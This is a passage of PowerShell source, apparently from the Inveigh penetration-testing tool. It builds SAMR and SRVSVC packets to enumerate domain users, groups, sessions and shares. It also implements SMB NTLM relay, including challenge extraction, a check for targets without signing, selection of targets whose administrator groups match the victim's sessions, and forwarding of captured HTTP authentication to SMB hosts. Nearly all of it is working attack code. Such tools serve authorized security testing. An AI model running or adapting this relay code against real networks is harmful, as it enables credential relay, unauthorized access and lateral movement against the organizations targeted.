    return $SAMRConnect5
}

function New-PacketSAMRGetMembersInAlias
{
    param([Byte[]]$Handle)

    $SAMRGetMembersInAlias = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRGetMembersInAlias.Add("PointerToConnectHandle",$Handle)

    return $SAMRGetMembersInAlias
}

function New-PacketSAMRClose
{
    param([Byte[]]$Handle)

    $SAMRClose = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRClose.Add("PointerToConnectHandle",$Handle)

    return $SAMRClose
}

function New-PacketSAMROpenAlias
{
    param([Byte[]]$Handle,[Byte[]]$RID)

    $SAMROpenAlias = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenAlias.Add("PointerToConnectHandle",$Handle)
    $SAMROpenAlias.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenAlias.Add("RID",$RID)

    return $SAMROpenAlias
}

function New-PacketSAMROpenGroup
{
    param([Byte[]]$Handle,[Byte[]]$RID)

    $SAMROpenGroup = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenGroup.Add("PointerToConnectHandle",$Handle)
    $SAMROpenGroup.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenGroup.Add("RID",$RID)

    return $SAMROpenGroup
}

function New-PacketSAMRQueryGroupMember
{
    param([Byte[]]$Handle)

    $SAMRQueryGroupMember = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRQueryGroupMember.Add("PointerToGroupHandle",$Handle)

    return $SAMRQueryGroupMember
}

function New-PacketSAMROpenDomain
{
    param([Byte[]]$Handle,[Byte[]]$SIDCount,[Byte[]]$SID)

    $SAMROpenDomain = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMROpenDomain.Add("PointerToConnectHandle",$Handle)
    $SAMROpenDomain.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMROpenDomain.Add("PointerToSid_Count",$SIDCount)
    $SAMROpenDomain.Add("PointerToSid_Sid",$SID)

    return $SAMROpenDomain
}

function New-PacketSAMREnumDomainUsers
{
    param([Byte[]]$Handle)

    $SAMREnumDomainUsers = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMREnumDomainUsers.Add("PointerToDomainHandle",$Handle)
    $SAMREnumDomainUsers.Add("PointerToResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMREnumDomainUsers.Add("AcctFlags",[Byte[]](0x10,0x00,0x00,0x00))
    $SAMREnumDomainUsers.Add("MaxSize",[Byte[]](0xff,0xff,0x00,0x00))

    return $SAMREnumDomainUsers
}

function New-PacketSAMRLookupNames
{
    param([Byte[]]$Handle,[String]$Names)

    [Byte[]]$names_bytes = [System.Text.Encoding]::Unicode.GetBytes($Names)
    [Byte[]]$name_len = ([System.BitConverter]::GetBytes($names_bytes.Length))[0,1]
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($Names.Length)

    $SAMRLookupNames = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRLookupNames.Add("PointerToDomainHandle",$Handle)
    $SAMRLookupNames.Add("NumNames",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_MaxCount",[Byte[]](0xe8,0x03,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_NameLen",$name_len)
    $SAMRLookupNames.Add("PointerToNames_Names_NameSize",$name_len)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_Name_MaxCount",$max_count)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRLookupNames.Add("PointerToNames_Names_Name_ActualCount",$max_count)
    $SAMRLookupNames.Add("PointerToNames_Names_Name_Names",$names_bytes)

    return $SAMRLookupNames
}

function New-PacketSAMRLookupRids
{
    param([Byte[]]$Handle,[Byte[]]$RIDCount,[Byte[]]$Rids)

    $SAMRLookupRIDS = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRLookupRIDS.Add("PointerToDomainHandle",$Handle)
    $SAMRLookupRIDS.Add("NumRids",$RIDCount)
    $SAMRLookupRIDS.Add("Unknown",[Byte[]](0xe8,0x03,0x00,0x00,0x00,0x00,0x00,0x00))
    $SAMRLookupRIDS.Add("NumRids2",$RIDCount)
    $SAMRLookupRIDS.Add("Rids",$Rids)

    return $SAMRLookupRIDS
}

# SRVSVC
function New-PacketSRVSVCNetSessEnum
{
    param([String]$ServerUNC)

    [Byte[]]$server_UNC = [System.Text.Encoding]::Unicode.GetBytes($ServerUNC)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($ServerUNC.Length + 1)
       
    if($ServerUNC.Length % 2)
    {
        $server_UNC += 0x00,0x00
    }
    else
    {
        $server_UNC += 0x00,0x00,0x00,0x00
    }

    $SRVSVCNetSessEnum = New-Object System.Collections.Specialized.OrderedDictionary
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_MaxCount",$max_count)
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ActualCount",$max_count)
    $SRVSVCNetSessEnum.Add("PointerToServerUNC_ServerUNC",$server_UNC)
    $SRVSVCNetSessEnum.Add("PointerToClient_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_MaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToClient_Client",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_ReferentID",[Byte[]](0x08,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_MaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_ActualCount",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToUser_User",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToLevel",[Byte[]](0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToLevel_Level",[Byte[]](0x0a,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_Ctr",[Byte[]](0x0a,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_ReferentID",[Byte[]](0x0c,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_Count",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("PointerToCtr_NetSessCtr_PointerToCtr10_Ctr10_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetSessEnum.Add("MaxBuffer",[Byte[]](0xff,0xff,0xff,0xff))
    $SRVSVCNetSessEnum.Add("PointerToResumeHandle_ReferentID",[Byte[]](0x10,0x00,0x02,0x00))
    $SRVSVCNetSessEnum.Add("PointerToResumeHandle_ResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))

    return $SRVSVCNetSessEnum
}

function New-PacketSRVSVCNetShareEnumAll
{
    param([String]$ServerUNC)

    $ServerUNC = "\\" + $ServerUNC
    [Byte[]]$server_UNC = [System.Text.Encoding]::Unicode.GetBytes($ServerUNC)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($ServerUNC.Length + 1)

    if($ServerUNC.Length % 2)
    {
        $server_UNC += 0x00,0x00
    }
    else
    {
        $server_UNC += 0x00,0x00,0x00,0x00
    }

    $SRVSVCNetShareEnum = New-Object System.Collections.Specialized.OrderedDictionary
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_MaxCount",$max_count)
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ActualCount",$max_count)
    $SRVSVCNetShareEnum.Add("PointerToServerUNC_ServerUNC",$server_UNC)
    $SRVSVCNetShareEnum.Add("PointerToLevel_Level",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Ctr",[Byte[]](0x01,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_Ctr1_Count",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("PointerToCtr_NetShareCtr_Pointer_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $SRVSVCNetShareEnum.Add("MaxBuffer",[Byte[]](0xff,0xff,0xff,0xff))
    $SRVSVCNetShareEnum.Add("ReferentID",[Byte[]](0x08,0x00,0x02,0x00))
    $SRVSVCNetShareEnum.Add("ResumeHandle",[Byte[]](0x00,0x00,0x00,0x00))

    return $SRVSVCNetShareEnum
}
    
}

# Relay Functions ScriptBlock
$SMB_relay_functions_scriptblock =
{

    function Get-SMBNTLMChallenge
    {
        param ([Byte[]]$Payload)

        $payload_converted = [System.BitConverter]::ToString($Payload)
        $payload_converted = $payload_converted -replace "-",""
        $NTLM_index = $payload_converted.IndexOf("4E544C4D53535000")

        if($payload_converted.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload_converted.SubString(($NTLM_index + 48),16)
        }

        $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $Payload
        $negotiate_flags = [System.Convert]::ToInt16(($payload_converted.SubString(($NTLM_index + 44),2)),16)
        $negotiate_flags = [Convert]::ToString($negotiate_flags,2)
        $target_info_flag = $negotiate_flags.SubString(0,1)

        if($target_info_flag -eq 1)
        {
            $target_info_index = ($NTLM_index + 80) / 2
            $target_info_index = $target_info_index + $target_name_length + 16
            $target_info_item_type = $Payload[$target_info_index]
            $i = 0

            while($target_info_item_type -ne 0 -and $i -lt 10)
            {
                $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $Payload

                switch($target_info_item_type) 
                {

                    2
                    {
                        $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                    }

                    3
                    {
                        $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                    }

                    4
                    {
                        $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                    }

                }

                $target_info_index = $target_info_index + $target_info_item_length + 4
                $target_info_item_type = $Payload[$target_info_index]
                $i++
            }

            if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)
            {
                $inveigh.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name") > $null
            }

            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
            {

                if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].Hostname)
                {
                    $inveigh.enumerate[$i].Hostname = $DNS_computer_name
                    $inveigh.enumerate[$i]."DNS Domain" = $DNS_domain_name
                    $inveigh.enumerate[$i]."netBIOS Domain" = $netBIOS_domain_name
                    break
                }

            }

        }

        return $NTLM_challenge
    }

    function Invoke-SMBConnect
    {
        param ($ProcessID,$SourceIP)

        function Test-SMBPort
        {
            param ($target)
            
            try
            {     
                $SMB_target_test = New-Object System.Net.Sockets.TCPClient
                $SMB_target_test_result = $SMB_target_test.BeginConnect($target,"445",$null,$null)
                $SMB_port_test_success = $SMB_target_test_result.AsyncWaitHandle.WaitOne(100,$false)
                $SMB_target_test.Close()

                if($SMB_port_test_success)
                {
                    $SMB_server = $true
                }
                else
                {
                    $SMB_server = $false    
                }

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].IP -eq $target)
                    {
                        $target_index = $i
                        break
                    }

                }

                if($target_index -and $inveigh.enumerate[$target_index].IP -eq $target)
                {
                    $inveigh.enumerate[$target_index]."SMB Server" = $SMB_server
                    $inveigh.enumerate[$target_index]."Targeted" = $(Get-Date -format s)
                }
                else
                {
                    $inveigh.enumerate.Add((New-RelayEnumObject -IP $target -SMBServer $SMB_server -Targeted $(Get-Date -format s))) > $null
                }

                return $SMB_port_test_success
            }
            catch 
            {
                return $false
            }

        }

        function Invoke-SMBNegotiate
        {
            param ($Target)

            $client = New-Object System.Net.Sockets.TCPClient
            $client.Client.ReceiveTimeout = 60000
            $client.Connect($target,"445")

            try
            {
                $client_stream = $client.GetStream()
                $stage = 'NegotiateSMB'
                $client_receive = New-Object System.Byte[] 1024
            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage") > $null
                $stage = 'Exit'
            }

            while($stage -ne 'Exit')
            {

                try
                {
                
                    switch ($stage)
                    {

                        'NegotiateSMB'
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $ProcessID 0x00,0x00       
                            $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()    
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB2 = $false
                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Negotiated SMB1 not supported") > $null
                                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying anonther target") > $null
                                $client.Close()
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB2 = $true
                                $stage = 'NegotiateSMB2'
                            }

                            if($target -and [System.BitConverter]::ToString($client_receive[70]) -eq '03')
                            {        
                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Signing is required on $target") > $null
                                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying another target") > $null
                                $signing = $true
                                $client.Close()
                                $stage = 'Exit'
                            }
                            else
                            {
                                $signing = $false    
                            }

                        }
                        
                        'NegotiateSMB2'
                        { 
                            $tree_ID = 0x00,0x00,0x00,0x00
                            $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                            $message_ID = 1
                            $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $ProcessID $tree_ID $session_ID  
                            $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()    
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            $stage = 'Exit'
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
                        }
                    
                    }

                }
                catch
                {
                    $error_message = $_.Exception.Message
                    $error_message = $error_message -replace "`n",""
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage") > $null
                    $stage = 'Exit'
                }
            
            }
            
            return $client,$SMB2,$signing
        }

        function Test-SMBTarget
        {
            param([Array]$targets,[Int]$limit,[String]$initiator)

            $filter_date = Get-Date

            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
            {

                if(!$inveigh.enumerate[$i].IP -or $inveigh.enumerate[$i].IP -eq $SourceIP -or $inveigh.enumerate[$i].Signing -or $inveigh.enumerate[$i]."SMB2.1" -eq $false -or 
                ($inveigh.enumerate[$i]."SMB Server" -eq $false -and (New-TimeSpan $inveigh.enumerate[$i].Targeted $filter_date).Minutes -lt $TargetRefresh))
                {

                    if($inveigh.enumerate[$i].IP)
                    {
                        $targets_excluded += @($inveigh.enumerate[$i].IP)
                    }

                }

            }

            if($targets -and $targets_excluded)
            {
                $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $targets_excluded -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                $sessions_temp = $inveigh.session
                
                if($targets -and $inveigh.relay_history_table.$SourceIP -and
                (Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP | Where-Object {$_.SideIndicator -eq "<="}))
                {
                    [Array]$targets = Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                }
                elseif($targets -and ($sessions_temp | Where-Object {$_.Status}))
                {
                    $targets_temp = $targets
                    $targets = @()
                    
                    foreach($target_entry in $targets_temp)
                    {
                        
                        $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'connected'})

                        if($sessions -and $sessions.Count -lt $limit)
                        {
                            $targets += $target_entry
                        }
                        elseif($initiator)
                        {
                            $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Initiator -eq $initiator -and $_.Status -eq 'connected'})

                            if($sessions -and $sessions.Count -lt $limit)
                            {
                                $targets += $target_entry
                            }

                        }

                    }

                    if(!$targets)
                    {

                        foreach($target_entry in $targets_temp)
                        {
                            $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'disconnected'})

                            if($sessions)
                            {
                                $targets += $target_entry
                            }

                        }

                    }
                        
                }
                
            }

            if($targets -and $inveigh.target_list)
            {
                $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.target_list -ExcludeDifferent -IncludeEqual -PassThru
            }

            $i = 0
            $random_index_history = @()

            while(!$target -and $i -lt $targets.Count)
            {
                $i++

                if($targets.Count -eq 1)
                {
                    $target = $targets[0]
                }
                else
                {
                    $random_range = 0..($targets.Count - 1)
                    $random_range_filtered = $random_range | Where-Object {$random_index_history -notcontains $_}

                    if($random_range_filtered)
                    {
                        $random_index = Get-Random -InputObject $random_range_filtered
                        $random_index_history += $random_index
                        $target = $targets[$random_index]
                    }

                }

                if($target -eq $SourceIP)
                {
                    $target = $null
                }

                if($target)
                {
                    $SMB_port_test_success = Test-SMBPort $target

                    if($SMB_port_test_success)
                    {
                        $SMB_negotiate = Invoke-SMBNegotiate $target
                        $client = $SMB_negotiate[0]
                        $SMB2 = $SMB_negotiate[1]
                        $signing = $SMB_negotiate[2]
                        $SMB_server = $true

                        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                        {

                            if($inveigh.enumerate[$i].IP -eq $target)
                            {
                                $target_index = $i
                                break
                            }

                        }

                        $inveigh.enumerate[$target_index]."SMB2.1" = $SMB2
                        $inveigh.enumerate[$target_index].Signing = $signing
                        $inveigh.enumerate[$target_index]."SMB Server" = $SMB_server
                        $inveigh.enumerate[$target_index]."Targeted" = $(Get-Date -format s)

                        if(!$SMB2 -and $signing)
                        {
                            $target = $null
                        }

                    }
                    else
                    {
                        $target = $null    
                    }

                }
                
            }
            
            return $client,$target
        }

        if($inveigh.target_list.Count -gt 1 -or (!$inveigh.target_list -and $inveigh.enumerate))
        {
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Searching for a target") > $null
        }

        try
        {
            $targets = $null
            $target = $null

            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
            {

                if($inveigh.enumerate[$i].IP -eq $SourceIP -and $inveigh.enumerate[$i].Sessions)
                {
                    [Array]$initiator_sessions = $inveigh.enumerate[$i].Sessions
                    break
                }

            }

            $initiator_sessions = $initiator_sessions | Sort-Object {Get-Random}
            
            # check if sessions match any local admin group members
            if($initiator_sessions)
            {
                
                foreach($session in $initiator_sessions)
                {

                    for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                    {

                        if($inveigh.enumerate[$i]."Administrator Users" -contains $session -and $inveigh.enumerate[$i].IP)
                        {
                            $targets += @($inveigh.enumerate[$i].IP)
                        }

                    }

                    if($targets)
                    {
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group match found for session $session on:") > $null
                        $inveigh.output_queue.Add(($targets -join ",")) > $null
                        $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv
                        $client = $SMB_target_results[0]
                        $target = $SMB_target_results[1]
                    }

                }

            }

            # check if sessions belong to groups that match any local admin group members
            if($initiator_sessions -and !$targets -and !$target)
            {

                function Get-SessionGroup
                {
                    param($session)

                    $group_list = @()
                    $group_table_keys_temp = $inveigh.group_table.keys

                    foreach($group in $group_table_keys_temp)
                    {

                        if($inveigh.group_table.$group -contains $session)
                        {
                            $group_list += $group
                        }

                    }

                    for($i=0;$i -lt $group_list.Count;$i++)
                    {
                        
                        foreach($group in $group_table_keys_temp)
                        {

                            if($inveigh.group_table.$group -contains $group_list[$i])
                            {
                                $group_list += $group
                            }

                        }

                    }

                    return $group_list
                }

                $session_groups = @()
                $targets = @()

                foreach($session in $initiator_sessions)
                {
                    $session_groups += Get-SessionGroup $session
                }

                if($session_groups)
                {

                    foreach($group in $session_groups)
                    {

                        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                        {

                            if($inveigh.enumerate[$i]."Administrator Groups" -contains $group -and $inveigh.enumerate[$i].IP)
                            {
                                $targets += @($inveigh.enumerate[$i].IP)
                            }

                        }

                        if($targets)
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group nested match found for $group from session $session on:") > $null
                            $inveigh.output_queue.Add(($targets -join ",")) > $null
                            $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv
                            $client = $SMB_target_results[0]
                            $target = $SMB_target_results[1]
                        }

                    }

                }

            }

            # check if source IP matches any netsessions
            if(!$targets -and !$target -and $SourceIP)
            {

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].NetSession -contains $SourceIP)
                    {
                        $targets += @($inveigh.enumerate[$i].IP)
                    }

                }

                if($targets)
                {
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] NetSession IP match found for $SourceIP on:") > $null
                    $inveigh.output_queue.Add(($targets -join ",")) > $null
                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitUnpriv
                    $client = $SMB_target_results[0]
                    $target = $SMB_target_results[1]
                }

            }

            # get list of systems with custom shares
            if(!$targets -and !$target)
            {

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].Shares)
                    {
                        $targets += @($inveigh.enumerate[$i].IP)
                    }

                }
                                
                if($targets)
                {
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Searching within the following list of systems hosting custom shares:") > $null
                    $inveigh.output_queue.Add(($targets -join ",")) > $null
                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitShare $SourceIP
                    $client = $SMB_target_results[0]
                    $target = $SMB_target_results[1]
                }

            }

            # get random target
            if(!$target -and $TargetMode -eq 'Random')
            {

                if($inveigh.target_list.Count -gt 1)
                {
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Selecting a random target") > $null
                }

                if($inveigh.target_list)
                {
                    $SMB_target_results = Test-SMBTarget $inveigh.target_list $SessionLimitUnpriv
                }
                else
                {
                    $targets = @()
                    $inveigh_enumerate.Count = $inveigh.enumerate.Count

                    for($i=0; $i -lt $hostname_encoded.Count; $i++)
                    {

                        if($inveigh_enumerate[$i].Hostname)
                        {
                            $targets += $inveigh_enumerate[$i].Hostname
                        }
                        elseif($inveigh_enumerate[$i].IP)
                        {
                            $targets += $inveigh_enumerate[$i].IP
                        }

                    }

                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitUnpriv
                }

                $client = $SMB_target_results[0]
                $target = $SMB_target_results[1]
            }

            if($target -and !$inveigh.relay_history_table.$SourceIP)
            {
                $inveigh.relay_history_table.Add($SourceIP,[Array]$target)
            }
            elseif($target -and $inveigh.relay_history_table.$SourceIP -notcontains $target)
            {
                $inveigh.relay_history_table.$SourceIP += $target
            }

        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        return $client,$target
    }

    function Invoke-SMBRelayChallenge
    {
        param ($client,$HTTP_request_bytes,$SMB_version,$SMB_process_ID)

        try
        {
            $client_stream = $client.GetStream()
            $client_receive = New-Object System.Byte[] 1024
            $message_ID = 2
            $tree_ID = 0x00,0x00,0x00,0x00
            $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate 0x07,0x82,0x08,0xa2 $HTTP_request_bytes[($HTTP_request_bytes.Length-8)..($HTTP_request_bytes.Length)]
            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            $client_stream.Write($client_send,0,$client_send.Length) > $null
            $client_stream.Flush()    
            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        return $client_receive
    }

    function Invoke-SMBRelayResponse
    {
        param ($client,$HTTP_request_bytes,$SMB_version,$SMB_user_ID,$session_ID,$SMB_process_ID)
    
        try
        {
            $client_receive = New-Object System.Byte[] 1024

            if($client)
            {
                $SMB_relay_response_stream = $client.GetStream()
            }

            $message_ID = 3
            $tree_ID = 0x00,0x00,0x00,0x00
            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID
            $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $HTTP_request_bytes
            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
            $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            $SMB_relay_response_stream.Write($client_send,0,$client_send.Length) > $null
            $SMB_relay_response_stream.Flush()
            $SMB_relay_response_stream.Read($client_receive,0,$client_receive.Length) > $null
            
            if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00'))
            {
                $SMB_relay_failed = $false
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay authentication successful for $HTTP_username_full on $Target") > $null              
            }
            else
            {

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].IP -eq $target)
                    {
                        $target_index = $i
                        break
                    }

                }

                $target_hostname = $inveigh.enumerate[$target_index].Hostname
                $target_DNS_domain = $inveigh.enumerate[$target_index]."DNS Domain"

